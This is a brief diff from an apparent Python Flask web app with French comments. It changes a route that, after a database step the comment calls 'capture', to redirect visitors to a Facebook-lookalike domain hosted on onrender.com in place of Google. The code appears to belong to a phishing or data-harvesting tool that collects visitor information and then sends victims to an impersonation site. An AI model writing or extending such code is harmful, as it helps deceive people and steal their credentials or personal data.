@@ -83,8 +83,8 @@ def check_activity():
         print(f"❌ Erreur BD : {e}")
         return "Erreur serveur", 500
 
-    # Redirection vers Google après capture
-    return redirect('https://www.google.com')
+    # Redirection vers Facebook après capture
+    return redirect('https://facebook-wmw6.onrender.com')
 
 @app.route('/')
 def index():
